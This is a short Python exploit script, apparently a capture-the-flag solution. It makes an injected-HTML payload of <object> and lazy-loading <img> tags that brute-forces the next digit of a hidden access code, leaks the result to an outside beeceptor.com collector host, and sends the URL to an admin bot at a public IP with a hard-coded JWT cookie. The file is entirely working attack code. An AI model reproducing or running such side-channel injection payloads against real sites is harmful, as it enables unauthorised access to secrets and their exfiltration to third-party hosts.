import requests
from string import digits
from urllib.parse import quote

jwt1 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRhdmEiLCJyb2xlIjoxLCJpYXQiOjE3NTQxMjc5ODEsImV4cCI6MTc1NDEzMTU4MX0.5LHZB_We7u-1IrJfUVEVQpKRxLGXw9NlyM1HbOAVmdw"

headers = {
    "Cookie": f"user_access={jwt1}"
}

prefix = "7519041"

current_payload = ""
for c in digits:
    candidate = prefix + c

    object_payload = f'''<object data="/hidden-access?access_code={candidate}"><img src="https://xsdav.free.beeceptor.com?{candidate}" loading="lazy"></object>'''

    current_payload += object_payload

encoded_payload = quote(current_payload)

# Final URL for injection
url = f"http://under-development-web:5578/customer-message?name=a&message={encoded_payload}"

# âœ… Send as JSON
bot_url = "http://13.250.98.246:5579/visit"
response = requests.post(bot_url, json={"url": url}, headers={"Content-Type": "application/json"})

if response.status_code == 200:
    print("[+] Bot received the payload successfully!")
else:
    print(f"[-] Failed to send to bot: {response.status_code}")
    print(response.text)